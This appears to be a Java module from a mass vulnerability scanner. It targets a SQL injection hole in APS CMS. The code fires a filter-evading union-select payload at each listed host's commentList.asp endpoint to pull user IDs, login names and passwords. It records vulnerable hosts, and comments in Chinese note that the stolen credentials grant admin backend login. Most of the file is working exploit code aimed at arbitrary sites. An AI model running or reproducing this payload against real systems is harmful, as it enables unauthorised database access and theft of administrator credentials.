package Vul_type;

import Request_method.RequestTemplate;
import Vul_check.VulRule;
import Vuldata_Controller.WriteFile;
import com.zsj.mapper.VulMapper;
import com.zsj.poji.vuldatas;
import org.apache.ibatis.io.Resources;
import org.apache.ibatis.session.SqlSession;
import org.apache.ibatis.session.SqlSessionFactory;
import org.apache.ibatis.session.SqlSessionFactoryBuilder;
import java.io.*;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class APScms_Sqli extends VulRule {
    public void check(int thread, List array, int len, final int outtime) throws IOException {
        for (final Object list : array){
            Thread th=new Thread(new Runnable() {
                public void run() {
                    String newurl=list+"/plug/comment/commentList.asp?id=-1%20unmasterion%20semasterlect%20top%201%20UserID,GroupID,LoginName,Password,now(),null,1%20%20frmasterom%20{prefix}user";
                    RequestTemplate requestTemplate = new RequestTemplate();
                    Map<String,Object> response=requestTemplate.GetBody(new HashMap<String, String>(),newurl,outtime);
                    Integer code = (Integer) response.get("Code");
                    String content = (String) response.get("Content");
                    try {
                        if (code!=200){
                            System.out.println(list+":  APSCMS_sql注入漏洞访问异常");
                        }
                        else {
                            if (content.indexOf("<div class=\"line1\"><span>")!=-1){
                                System.out.println(list+":    *****存在APSCMS_sql注入漏洞*****");
                                vuldatas vuldatas = new vuldatas();
                                vuldatas.setVul_host((String) list);
                                vuldatas.setVul_name("ApsSql注入漏洞");
                                vuldatas.setVul_payload(newurl);
                                vuldatas.setVul_describe("可以通过该sql注入漏洞获取账号和密码登录后台");

                                /*
                                * 存入临时目录
                                * */
                                new WriteFile().writeFile("temp.txt",list+":    *****存在APSCMS_sql注入漏洞*****\n");
                                /*
                                 * 存入永久数据库
                                 * */
                                String resource ="mybatis-config.xml";
                                InputStream inputStream = Resources.getResourceAsStream(resource);
                                SqlSessionFactory sqlSessionFactory =new SqlSessionFactoryBuilder().build(inputStream);
                                SqlSession sqlSession =sqlSessionFactory.openSession();
                                VulMapper vulMapper =sqlSession.getMapper(VulMapper.class);
                                vulMapper.add_Apssql(vuldatas);
                                sqlSession.commit();
                                sqlSession.close();

                            }
                            else {
                                System.out.println(list+":   不存在APSCMS_sql注入漏洞");
                            }
                        }
                    }catch (Exception e){
                        System.out.println(list+":   APSCMS_sql注入漏洞连接超时或服务端已断TCP连接");
                    }
                }
            });
            th.start();
            th.interrupt();

        }
    }
}
